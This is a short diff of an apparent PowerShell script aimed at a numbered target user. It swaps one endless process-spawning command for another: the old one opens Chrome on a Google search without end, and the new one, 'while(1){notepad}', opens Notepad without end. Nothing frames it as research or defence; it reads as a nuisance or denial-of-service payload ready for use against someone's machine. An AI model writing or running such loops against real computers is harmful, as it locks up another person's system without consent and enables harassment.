@@ -1,5 +1,5 @@
 $target_user = "42131"
-$command = "﻿While (1) { Start-Process chrome 'https://www.google.com/search?q=among+us&rlz=1C1GCEA_enGB1127GB1127&oq=among+us&gs_lcrp=EgZjaHJvbWUqDQgAEAAY4wIYsQMYgAQyDQgAEAAY4wIYsQMYgAQyCggBEC4YsQMYgAQyCggCEAAYsQMYgAQyCggDEAAYsQMYgAQyCggEEAAYsQMYgAQyCggFEAAYsQMYgAQyCggGEAAYsQMYgAQyCggHEAAYsQMYgAQyCggIEAAYsQMYgAQyCggJEC4YsQMYgATSAQgxMTUxajBqN6gCALACAA&sourceid=chrome&ie=UTF-8' }"
+$command = "while(1){notepad}"
 
 #$e = dir "c:\Cache\pc-client.exe-1.0.0.0-0"
 
